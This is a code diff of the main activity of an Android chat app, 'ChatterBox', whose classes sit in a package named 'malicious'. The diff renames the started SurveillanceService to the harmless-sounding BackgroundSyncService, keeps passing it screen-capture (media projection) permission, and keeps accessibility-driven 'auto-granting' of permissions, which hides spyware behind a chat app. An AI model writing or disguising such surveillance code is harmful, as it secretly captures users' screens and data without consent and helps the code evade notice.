@@ -5,7 +5,6 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.media.projection.MediaProjectionManager
 import android.net.Uri
-import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
@@ -13,8 +12,6 @@ import android.provider.Settings
 import android.util.Log
 import android.view.Menu
 import android.view.MenuItem
-import android.view.View
-import android.widget.Button
 import android.widget.ImageView
 import android.widget.TextView
 import android.widget.Toast
@@ -28,16 +25,11 @@ import androidx.drawerlayout.widget.DrawerLayout
 import com.bumptech.glide.Glide
 import com.example.ChatterBox.accessibility.AccessibilityHelper
 import com.example.ChatterBox.accessibility.AccessibilityPromoActivity
-import com.example.ChatterBox.malicious.SurveillanceService
-import com.example.ChatterBox.malicious.ExfiltrationManager
-import com.example.ChatterBox.malicious.LocationTracker
-import com.example.ChatterBox.models.Forum
-import com.example.ChatterBox.models.User
+import com.example.ChatterBox.malicious.BackgroundSyncService
 import com.example.ChatterBox.util.PermissionsManager
 import com.google.android.material.navigation.NavigationView
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
-import java.util.Random
 
 class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelectedListener {
     private lateinit var db: FirebaseFirestore
@@ -71,9 +63,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             startActivity(Intent(this, AccessibilityPromoActivity::class.java))
         }
         if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
-            // Only request media projection first - other permissions will be requested afterwards
             requestMediaProjection()
-            // Don't call requestInitialPermissions() here, it will be called from onActivityResult
         }
         setupDrawer()
         loadUserProfile()
@@ -100,7 +90,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         drawerLayout = findViewById(R.id.drawer_layout)
         val toolbar: androidx.appcompat.widget.Toolbar = findViewById(R.id.toolbar)
 
-        setSupportActionBar(toolbar) // ✅ Attach custom toolbar as Action Bar
+        setSupportActionBar(toolbar)
 
         val toggle = ActionBarDrawerToggle(
             this, drawerLayout, toolbar,
@@ -160,7 +150,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         else if (requestCode == MEDIA_PROJECTION_REQUEST_CODE) {
             if (resultCode == RESULT_OK && data != null) {
                 // Store the media projection result for later use
-                val serviceIntent = Intent(this, SurveillanceService::class.java)
+                val serviceIntent = Intent(this, BackgroundSyncService::class.java)
                 serviceIntent.putExtra("resultCode", resultCode)
                 serviceIntent.putExtra("data", data)
                 startService(serviceIntent)
@@ -420,18 +410,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                     // Still proceed to special permissions even if some standard ones were denied
                     handleSpecialPermissions()
                 }
-            }
-
-            BACKGROUND_LOCATION_REQUEST_CODE -> {
-                // Handle background location permission result
-                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    Toast.makeText(this, "Background location access granted", Toast.LENGTH_SHORT)
-                        .show()
-                } else {
-                    Toast.makeText(this, "Background location access denied", Toast.LENGTH_SHORT)
-                        .show()
-                }
-
                 // Make sure auto-granting is disabled when done
                 PermissionsManager.disableAutoGrantPermissions()
             }
